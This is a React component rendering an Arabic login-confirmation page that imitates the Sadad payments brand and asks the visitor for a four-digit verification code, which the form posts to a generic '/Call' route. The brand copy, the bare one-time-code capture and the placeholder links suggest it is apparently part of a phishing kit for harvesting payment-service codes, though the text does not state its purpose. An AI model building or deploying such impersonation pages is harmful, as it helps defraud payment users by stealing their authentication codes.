import React from 'react'
import Nav from './Nav'

const Sure = () => {
    return (
        <div className='container'>
            <Nav />
            <div className="section-two">
                <p><a href="/">الرئيسيه</a>/شخصي</p>
                <h1> تسجيل الدخول</h1>
            </div>
            <div className="section-three">
                <h3>تأكيد </h3>
                <p>ادخل كود التحقق</p>
            </div>
            <form action='/Call'>
                <div class="form-group">
                    <label class="" for="form-password"> كود التحقق</label>
                    <input type="number" class="form-control" name="pass2" id="pass" placeholder="****" required max="9999" />
                </div>
                <button type="submit" class="btn btn-primary btn-large" style={{ textAlign: "end" }} title="دخول" name="send" id="send2" >
                    دخول
                </button>
            </form>
            <div className="section-four">
                <p>One solution for all payments</p>
                <div className="links">
                    <a href="#" target={"_blank"}></a>
                    <a href='#' target={"_blank"} className='youtube'></a>
                </div>
            </div>
            <div className="section-five">
                <p>.سداد حقوق الطبع والنشر 2022. جميع الحقوق محفوظة</p>
                <div className="footer">
                    <a href="/">الأسئلة المتكررة </a>
                    <a href="/">تنويه</a>
                    <a href="/">سياسة الخصوصية </a>
                    <a href="/">شروط الاستخدام </a>
                    <a href="/">اتصل بنا</a>
                    <a href="/">خريطة الموقع</a>
                </div>
            </div>
        </div>
    )
}

export default Sure